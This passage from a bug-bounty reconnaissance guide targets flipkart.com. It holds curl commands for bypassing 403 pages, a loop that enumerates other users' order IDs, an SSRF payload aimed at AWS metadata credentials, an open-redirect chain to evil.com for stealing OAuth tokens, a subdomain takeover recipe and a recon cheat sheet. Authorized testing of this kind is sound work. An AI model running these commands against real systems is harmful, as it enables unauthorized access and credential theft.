| **SSRF** | Parameter discovery (url=, redirect=, src=) | Internal IPs |
| **XSS** | Parameter discovery → GF patterns | Dalfox automation |
| **SQLi** | PHP URL params → GF patterns | SQLMap |
| **Exposed API** | JS analysis, Swagger search | Fuzzing |
| **Cloud Bucket** | Org name, Tech fingerprint | cloud_enum |
| **Credential Leaks** | GitHub dorking, JS secrets | SecretFinder |
| **Auth Bypass** | 403 sorted hosts | 403bypass scripts |
| **CORS Misconfiguration** | API endpoints | Curl + Origin header |
| **Path Traversal** | Dir bruteforce → LFI gf | Payloads |
| **Prototype Pollution** | Node.js tech detection | JS fuzzing |
| **Open Redirect** | GF redirect patterns | Takeover |
| **XXE** | File upload endpoints, XML APIs | Burp |

### 30.3 403 Bypass Techniques

```bash
# 403 Forbidden bypass methods — after finding 403s in httpx
TARGET_PATH="/admin"
BASE="https://www.flipkart.com"

# Header-based bypass
curl -sk -H "X-Original-URL: $TARGET_PATH" $BASE/
curl -sk -H "X-Rewrite-URL: $TARGET_PATH" $BASE/
curl -sk -H "X-Override-URL: $TARGET_PATH" $BASE/
curl -sk -H "X-Forwarded-For: 127.0.0.1" $BASE$TARGET_PATH
curl -sk -H "X-Real-IP: 127.0.0.1" $BASE$TARGET_PATH
curl -sk -H "X-Custom-IP-Authorization: 127.0.0.1" $BASE$TARGET_PATH
curl -sk -H "X-Originating-IP: 127.0.0.1" $BASE$TARGET_PATH

# Path manipulation bypass
curl -sk "$BASE$TARGET_PATH/../$TARGET_PATH"
curl -sk "$BASE$TARGET_PATH.json"
curl -sk "$BASE$TARGET_PATH/"
curl -sk "${BASE}${TARGET_PATH,,}"  # lowercase
curl -sk "${BASE}${TARGET_PATH^^}"  # uppercase
curl -sk "$BASE/$TARGET_PATH%20"
curl -sk "$BASE/$TARGET_PATH%09"
curl -sk "$BASE/${TARGET_PATH:1}"  # Remove leading slash

# Method switching
curl -sk -X OPTIONS $BASE$TARGET_PATH
curl -sk -X HEAD $BASE$TARGET_PATH
curl -sk -X TRACE $BASE$TARGET_PATH
curl -sk -X PUT $BASE$TARGET_PATH -d '{}'
```

### 30.4 IDOR Discovery Workflow

```bash
# 1. Find endpoints with ID-like parameters
cat $OUTDIR/urls/all_urls.txt | grep -oP "[?&](id|user_id|order_id|account|product|item)=\d+" | sort -u

# 2. Use Arjun to find hidden params
arjun -u "https://www.flipkart.com/api/users" -m GET

# 3. Try sequential IDs
for id in {1..100}; do
  response=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Cookie: YOUR_SESSION" \
    "https://www.flipkart.com/api/orders/$id")
  [[ "$response" == "200" ]] && echo "FOUND: /api/orders/$id"
done

# 4. Try other user's IDs (different account)
# If you see your order at /api/orders/48291, try 48290, 48292
```

### 30.5 How to Chain Recon Findings

**Chain Example 1 — SSRF to Cloud Metadata:**
```
Step 1: Find URL with ?url= parameter (from paramspider)
Step 2: Confirm it makes outbound requests (use burpcollaborator)
Step 3: Test internal AWS metadata endpoint
  payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 4: Extract IAM credentials → AWS account takeover
→ P1 Critical
```

**Chain Example 2 — Open Redirect to OAuth Token Theft:**
```
Step 1: Find ?redirect= parameter on OAuth flow (from Wayback URLs)
Step 2: Confirm it redirects to external domain
  payload: https://flipkart.com/oauth/callback?redirect=https://evil.com
Step 3: Steal OAuth tokens in access_token fragment
→ P1 Critical (Account Takeover)
```

**Chain Example 3 — Subdomain + Stale S3:**
```
Step 1: Find subdomain: assets-old.flipkart.com → points to deleted S3 bucket
Step 2: Register the S3 bucket with same name
Step 3: Host malicious content
Step 4: assets-old.flipkart.com now serves your content
→ P2 High (Subdomain Takeover)
```

---

## 31. Full Automation Pipeline

### 31.1 Continuous Monitoring Script

```bash
#!/bin/bash
# monitor.sh — Run daily via cron for new assets

TARGET=$1
OUTDIR=~/recon/targets/$TARGET
DATE=$(date +%Y%m%d)
PREV_SUBS=$OUTDIR/subdomains/resolved.txt
NEW_SUBS=$OUTDIR/subdomains/new_$DATE.txt

echo "[+] Running daily recon refresh for $TARGET"

# Fresh subdomain scan
subfinder -d $TARGET -silent | sort -u > /tmp/fresh_subs.txt
cat $OUTDIR/subdomains/assetfinder.txt $OUTDIR/subdomains/crtsh.txt >> /tmp/fresh_subs.txt
sort -u /tmp/fresh_subs.txt > /tmp/current.txt

# Find NEW subdomains
comm -23 /tmp/current.txt $PREV_SUBS > $NEW_SUBS

if [[ -s $NEW_SUBS ]]; then
  echo "[!] NEW SUBDOMAINS FOUND:"
  cat $NEW_SUBS
  
  # Probe new subs
  cat $NEW_SUBS | httpx -status-code -title -silent | tee $OUTDIR/new_hosts_$DATE.txt
  
  # Quick nuclei scan
  cat $NEW_SUBS | httpx -silent | nuclei -severity critical,high -silent | tee $OUTDIR/nuclei/new_$DATE.txt
  
  # Send notification (configure with your webhook)
  curl -X POST $SLACK_WEBHOOK -d "{\"text\": \"New subs for $TARGET: $(cat $NEW_SUBS | tr '\n' ', ')\"}"
fi

# Update main list
cat /tmp/current.txt | anew $PREV_SUBS
echo "[+] Done. New subs: $(wc -l < $NEW_SUBS)"
```

```bash
# Add to crontab
echo "0 6 * * * /bin/bash ~/recon/monitor.sh flipkart.com >> ~/recon/logs/flipkart_$(date +\%Y\%m\%d).log 2>&1" | crontab -
```

---

## 32. Cheat Sheet — All Commands

### Quick Reference

```bash
# ======================================
# SUBDOMAIN ENUM
# ======================================
subfinder -d TARGET -all -silent
assetfinder --subs-only TARGET
curl -s "https://crt.sh/?q=%.TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
amass enum -passive -d TARGET
cat subs.txt | dnsgen - | puredns resolve --resolvers resolvers.txt
cat subs.txt | alterx | dnsx -silent

# ======================================
# DNS
# ======================================
dnsx -l subs.txt -a -resp-only -silent
dnsx -l subs.txt -cname -resp -silent
dig AXFR TARGET @ns1.TARGET
subjack -w subs.txt -t 100 -ssl

# ======================================
# HTTP PROBE
# ======================================
cat subs.txt | httpx -status-code -title -tech-detect -server -follow-redirects -json -o out.json
cat out.json | jq -r 'select(.status_code==200) | .url'
cat out.json | jq -r 'select(.status_code==403) | .url'

# ======================================
# URL COLLECTION
# ======================================
gau TARGET
waybackurls TARGET
katana -u URL -jc -d 5
cat urls.txt | uro > deduped.txt

# ======================================
# DIRECTORY BRUTE
# ======================================
ffuf -w wordlist.txt -u URL/FUZZ -mc 200,301,403 -t 50
feroxbuster -u URL -w wordlist.txt -x php,html,js --depth 3
gobuster dir -u URL -w wordlist.txt -x php,txt,json -t 50

# ======================================
# JS ANALYSIS
# ======================================
cat urls.txt | grep "\.js$" | sort -u
python3 linkfinder.py -i URL/app.js -o cli
python3 SecretFinder.py -i file.js -o cli

# ======================================
# PARAMETER DISCOVERY
# ======================================
arjun -u URL -m GET
cat urls.txt | gf xss > xss.txt
cat urls.txt | gf sqli > sqli.txt
cat urls.txt | gf ssrf > ssrf.txt
cat urls.txt | gf lfi > lfi.txt
cat urls.txt | gf redirect > redirect.txt

# ======================================
# TECH DETECTION
# ======================================
whatweb URL -v
wafw00f URL
cat live.txt | httpx -tech-detect

# ======================================
# WORDPRESS
# ======================================
wpscan --url URL --enumerate u,p,vp,vt --api-token TOKEN
curl -sk URL/wp-login.php | grep "WordPress"
curl -sk URL/xmlrpc.php
curl -sk URL/wp-json/wp/v2/users

# ======================================
# CLOUD
# ======================================
python3 cloud_enum.py -k KEYWORD
s3scanner scan --bucket-file buckets.txt
aws s3 ls s3://BUCKET --no-sign-request

# ======================================
# NUCLEI
# ======================================
nuclei -l live.txt -severity critical,high -o results.txt
nuclei -l live.txt -t exposures/ -t misconfiguration/
nuclei -l live.txt -tags sqli,xss,ssrf,lfi

# ======================================
# SHODAN
# ======================================
shodan search 'org:"Flipkart Internet Private Limited"'
shodan search 'ssl.cert.subject.cn:"*.flipkart.com"'

# ======================================
# GOOGLE DORKS
# ======================================
# site:*.flipkart.com -www
# site:flipkart.com ext:env OR ext:config OR ext:sql
# site:flipkart.com inurl:admin OR inurl:login
# "flipkart.com" site:pastebin.com

# ======================================
# ROBOTS & SITEMAP
# ======================================
curl -sk URL/robots.txt | grep -i disallow
curl -sk URL/sitemap.xml | grep -oP "https?://[^<]+"
curl -sk URL/.well-known/security.txt

# ======================================
# SORTING & ANALYSIS
# ======================================
cat urls.txt | sort -u | uro
cat httpx.json | jq -r 'select(.status_code==200) | .url'
cat httpx.json | jq -r '.tech[]?' | sort | uniq -c | sort -rn
cat urls.txt | grep "=" | grep -oP "(?<=[?&])\w+" | sort | uniq -c | sort -rn
```

---

## Appendix A — Wordlists to Always Have

```bash
# DNS
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/dns-Jhaddix.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt

# Directories
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-directories.txt
https://wordlists-cdn.assetnote.io/data/httparchive_directories_1m_2021_04_28.txt

# APIs
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt

# Parameters
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt

# Resolvers
https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt
```

---

## Appendix B — API Keys You Need

| Service | URL | Used By |
|---------|-----|---------|
| Shodan | shodan.io | Subfinder, Shodan CLI, Amass |
| SecurityTrails | securitytrails.com | Subfinder, Amass |
| VirusTotal | virustotal.com | Subfinder |
| Censys | censys.io | Subfinder, Censys CLI |
| GitHub | github.com/settings/tokens | GitDorker, TruffleHog |
| WPScan | wpscan.com | WPScan |
| Hunter.io | hunter.io | Email recon |
| HIBP | haveibeenpwned.com | Breach check |
| BinaryEdge | binaryedge.io | Subfinder |
| Chaos (ProjectDiscovery) | chaos.projectdiscovery.io | Pre-built subdomain datasets |

---

## Appendix C — Recon Notes Template

```markdown
# Recon Notes — [TARGET] — [DATE]

## Scope
- In scope: *.flipkart.com, *.flipkart.net
- Out of scope: customer data, DoS

## Statistics
- Total subdomains found: 
- Live hosts: 
- Total URLs: 
- Unique parameters: 

## Interesting Findings

### High Priority
- [ ] dev.flipkart.com — Swagger UI exposed — /api/v2/users/{id} IDOR possible
- [ ] api-internal.flipkart.com — No auth required — 200 on all endpoints

### Medium Priority  
- [ ] blog.flipkart.com — WordPress 5.9 — Check vulnerable plugins

### Low Priority
- [ ] staging.flipkart.com — Old React build — Check JS for secrets

## Technologies Found
- Main site: React, Nginx, Node.js
- API: Java Spring, Tomcat
- Blog: WordPress 5.9

## Credentials Found
- None so far

## Next Steps
1. Test IDOR on dev API
2. Run WPScan on blog
3. Check JS files for API keys
```

---

*Last Updated: 2025 | For authorized security research only | Always stay in scope*
